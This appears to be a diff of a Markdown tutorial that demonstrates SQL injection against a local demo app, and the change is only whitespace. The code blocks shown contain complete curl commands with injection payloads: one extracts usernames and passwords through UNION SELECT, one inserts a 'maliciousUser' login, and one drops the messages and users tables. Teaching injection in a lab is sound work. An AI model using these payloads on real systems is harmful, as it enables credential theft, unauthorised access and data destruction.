@@ -66,7 +66,7 @@ Because the entrypoint for the data is in the URL, the SQL statement will need t
 
 ```sh
 curl \
-	"http://localhost:3000/messages/1%20OR%201%3D1%20UNION%20ALL%20SELECT%20id%2C%200%20AS%20user_id%2C%20username%20%7C%7C%20'%20-%20'%20%7C%7C%20password%20FROM%20users%20--"
+"http://localhost:3000/messages/1%20OR%201%3D1%20UNION%20ALL%20SELECT%20id%2C%200%20AS%20user_id%2C%20username%20%7C%7C%20'%20-%20'%20%7C%7C%20password%20FROM%20users%20--"
 ```
 
 ## Inserting a login for a malicious user into the users table
@@ -94,9 +94,9 @@ Because the entrypoint for the data is in the body of the request, the SQL state
 
 ```sh
 curl \
-	--request POST \
-	--data-binary "', 1); INSERT INTO users (username, password) VALUES ('maliciousUser', 'p@$$w0rd'); --" \
-	http://localhost:3000/message/1
+--request POST \
+--data-binary "', 1); INSERT INTO users (username, password) VALUES ('maliciousUser', 'p@$$w0rd'); --" \
+http://localhost:3000/message/1
 ```
 
 ## Destroying the table data in the database
@@ -119,7 +119,7 @@ The `DROP TABLE` statements will destroy the tables, resulting in the loss of al
 
 ```sh
 curl \
-	--request POST \
-	--data-binary "', 1); DROP TABLE messages; DROP TABLE users; --" \
-	http://localhost:3000/message/1
+--request POST \
+--data-binary "', 1); DROP TABLE messages; DROP TABLE users; --" \
+http://localhost:3000/message/1
 ```
